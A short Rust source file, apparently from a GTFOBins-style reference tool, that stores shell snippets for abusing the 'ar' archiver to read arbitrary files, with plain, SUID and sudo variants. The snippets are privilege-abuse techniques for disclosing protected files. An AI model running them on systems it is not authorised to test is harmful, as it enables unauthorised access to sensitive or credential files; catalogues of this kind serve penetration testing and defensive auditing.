
pub static BIN_NAME: &'static str = "ar";
pub static BIN_DESC: &'static str = "The file appears amid the binary content of the archive.";

pub static FR_CODE: &'static str = r#"
    
    TF=$(mktemp -u)
    LFILE=file_to_read
    ar r "$TF" "$LFILE"
    cat "$TF"
"#;
pub static SUID_CODE: &'static str = r#"
    
    sudo install -m =xs $(which ar) .

    TF=$(mktemp -u)
    LFILE=file_to_read
    ./ar r "$TF" "$LFILE"
    cat "$TF"
"#;
pub static SUDO_CODE: &'static str = r#"
    
    TF=$(mktemp -u)
    LFILE=file_to_read
    sudo ar r "$TF" "$LFILE"
    cat "$TF"
"#;
use crate::code::{Code, Tag};
pub static FR: Code<'static> = Code {
    title: "FR_CODE",
    code: FR_CODE,
    tag: Tag::FR,
};
pub static SUID: Code<'static> = Code {
    title: "SUID_CODE",
    code: SUID_CODE,
    tag: Tag::SUID,
};
pub static SUDO: Code<'static> = Code {
    title: "SUDO_CODE",
    code: SUDO_CODE,
    tag: Tag::SUDO,
};
